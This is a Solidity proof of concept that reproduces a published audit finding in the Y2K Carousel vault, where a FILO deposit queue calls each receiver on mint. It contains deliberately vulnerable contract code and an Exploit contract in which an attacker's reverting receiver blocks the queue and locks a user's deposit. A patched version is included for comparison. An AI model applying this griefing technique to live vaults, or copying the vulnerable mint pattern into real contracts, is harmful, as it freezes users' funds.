// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Y2K Carousel — mintDepositInQueue is FILO and _mint always calls the
    receiver (Sherlock 2023-03, finding 18537, Carousel.mintDepositInQueue).

    SYNTHETIC, cheatcode-free. The user queues 100e18. The attacker queues
    1e18 behind them with a receiver that reverts on ERC1155 receipt.
    The relayer processes the tail first. The acceptance check reverts, the
    whole queue call reverts, and the user's 100e18 stays stuck.

    The control mints without the acceptance check. The same queue completes
    and the user withdraws 100e18. */

interface IERC1155Receiver {
    function onERC1155Received(address operator, address from, uint256 id, uint256 amount, bytes calldata data)
        external
        returns (bytes4);
}

contract Asset {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external {
        allowance[msg.sender][spender] = amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Carousel {
    struct QueueItem {
        uint256 assets;
        address receiver;
    }

    Asset public asset;
    QueueItem[] public depositQueue;
    mapping(address => uint256) public shares;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function queueLength() public view returns (uint256) {
        return depositQueue.length;
    }

    function enqueue(uint256 assets) external {
        asset.transferFrom(msg.sender, address(this), assets);
        depositQueue.push(QueueItem({assets: assets, receiver: msg.sender}));
    }

    function mintDepositInQueue(uint256 operations) external {
        uint256 length = depositQueue.length;
        if (length == 0) revert("empty");
        if (operations > length) operations = length;
        // queue is executed from the tail to the head (FILO)
        uint256 i = length - 1;
        while ((length - operations) <= i) {
            _mintShares(depositQueue[i].receiver, depositQueue[i].assets);
            depositQueue.pop();
            if (i == 0) break;
            unchecked {
                i--;
            }
        }
    }

    function withdraw(uint256 amount) external {
        require(shares[msg.sender] >= amount, "no shares");
        shares[msg.sender] -= amount;
        asset.transfer(msg.sender, amount);
    }

    function _mintShares(address to, uint256 amount) internal {
        _mint(to, amount);
    }

    function _mint(address to, uint256 amount) internal virtual {
        require(to != address(0), "ERC1155: mint to the zero address");
        shares[to] += amount;
        _doSafeTransferAcceptanceCheck(to, amount);
    }

    function _doSafeTransferAcceptanceCheck(address to, uint256 amount) internal {
        if (to.code.length > 0) {
            // @> VULN: mint always calls the receiver, so one reverting receiver aborts the whole deposit queue.
            IERC1155Receiver(to).onERC1155Received(address(this), address(0), 1, amount, "");
        }
    }
}

contract CarouselFixed is Carousel {
    constructor(Asset _asset) Carousel(_asset) {}

    function _mint(address to, uint256 amount) internal override {
        require(to != address(0), "ERC1155: mint to the zero address");
        shares[to] += amount;
    }
}

contract User is IERC1155Receiver {
    function deposit(Carousel vault, Asset asset, uint256 amount) external {
        asset.approve(address(vault), amount);
        vault.enqueue(amount);
    }

    function pull(Carousel vault, uint256 amount) external {
        vault.withdraw(amount);
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC1155Receiver.onERC1155Received.selector;
    }
}

contract Reverter is IERC1155Receiver {
    function deposit(Carousel vault, Asset asset, uint256 amount) external {
        asset.approve(address(vault), amount);
        vault.enqueue(amount);
    }

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        revert("reject");
    }
}

contract Exploit {
    uint256 public constant N = 100 ether;

    Asset public asset;
    Carousel public vault;
    User public user;
    Reverter public attacker;
    uint256 public queuedBefore;
    uint256 public queuedAfter;
    uint256 public sharesAfter;
    bool public queueReverted;
    bool public withdrawReverted;
    uint256 public stuck;

    constructor() {
        asset = new Asset();
        vault = new Carousel(asset);
        user = new User();
        attacker = new Reverter();
    }

    function run() external {
        asset.mint(address(user), N);
        asset.mint(address(attacker), 1 ether);
        user.deposit(vault, asset, N);
        attacker.deposit(vault, asset, 1 ether);
        queuedBefore = vault.queueLength();
        try vault.mintDepositInQueue(queuedBefore) {
            queueReverted = false;
        } catch {
            queueReverted = true;
        }
        queuedAfter = vault.queueLength();
        sharesAfter = vault.shares(address(user));
        try user.pull(vault, N) {
            withdrawReverted = false;
        } catch {
            withdrawReverted = true;
        }
        stuck = asset.balanceOf(address(vault)) - 1 ether;
        require(queuedBefore == 2, "user was not ahead of the attacker");
        require(queueReverted, "queue did not revert");
        require(queuedAfter == 2, "queue was cleared");
        require(sharesAfter == 0, "user received shares");
        require(withdrawReverted, "user withdrew");
        require(stuck == N, "harm");
    }
}
